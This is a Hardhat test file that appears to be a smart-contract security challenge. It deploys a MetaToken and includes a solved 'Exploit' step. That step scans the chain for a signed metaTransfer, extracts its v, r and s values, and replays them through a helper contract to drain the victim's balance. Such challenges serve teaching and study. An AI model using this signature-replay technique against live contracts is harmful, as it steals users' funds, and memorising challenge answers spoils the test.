const { expect } = require('chai')
const { ethers } = require('hardhat')

function generateMessageHash(sender, receiver, amount, nonce) {
    const message = new ethers.utils.AbiCoder().encode(
        ['address', 'address', 'uint256', 'uint256'],
        [sender, receiver, amount, nonce]
    )
    return ethers.utils.keccak256(message)
}

describe('[META TOKEN EXPLOIT]', async function () {
    let deployer, attacker

    const INITIAL_BALANCE = ethers.utils.parseEther('100')
    const TRANSFER_AMOUNT = ethers.utils.parseEther('10')

    before(async function () {
        // SET UP
        ;[deployer, attacker, alice] = await ethers.getSigners()

        this.token = await (
            await ethers.getContractFactory('MetaToken', deployer)
        ).deploy("Meta Token", "Meta", INITIAL_BALANCE)

        await this.token.transfer(alice.address, INITIAL_BALANCE)

        const nonce = await this.token.nonce()

        const messageHash = generateMessageHash(
            alice.address,
            attacker.address,
            TRANSFER_AMOUNT,
            nonce.toString()
        )

        this.signature = ethers.utils.splitSignature(
            await alice.signMessage(ethers.utils.arrayify(messageHash))
        )

        await this.token.metaTransfer(
            alice.address,
            attacker.address,
            TRANSFER_AMOUNT,
            this.signature.v,
            this.signature.r,
            this.signature.s
        )

        expect(
            await this.token.balanceOf(alice.address)
        ).to.be.equal(INITIAL_BALANCE.sub(TRANSFER_AMOUNT))
    })

    it('Exploit', async function () {
        // YOUR EXPLOIT HERE

        let exploit = await (await ethers.getContractFactory('MetaTokenExploit', deployer)).deploy(this.token.address)

        const iface = new ethers.utils.Interface(['function metaTransfer(address sender, address receiver, uint256 amount, uint256 v, uint256 r, uint256 s)'])

        const provider = attacker.provider

        let done = false;

        // iterate over latest blocks
        for(let blockNumber = 0; blockNumber < (await provider.getBlockNumber()); blockNumber++) {
        
            // get transactions hash
            let transactions = (await provider.getBlock(blockNumber)).transactions
            
            for(const txHash of transactions) {

                try {
                    // get the tx data ...
                    let txData = (await provider.getTransaction(txHash)).data
                    
                    // ... and try to decode it
                    let {sender, receiver, amount, v, r, s} = iface.decodeFunctionData('metaTransfer', txData)

                    expect(sender).to.be.equal(alice.address)
                    expect(receiver).to.be.equal(attacker.address)
                    
                    await exploit.connect(attacker).run(sender, attacker.address, amount, v, r, s);
                    done = true;

                } catch {}
            }

            if(done) break
        }

    })

    after(async function () {
        // SUCCESS CONDITIONS
        expect(await this.token.balanceOf(alice.address)).to.be.equal('0')
    })
})
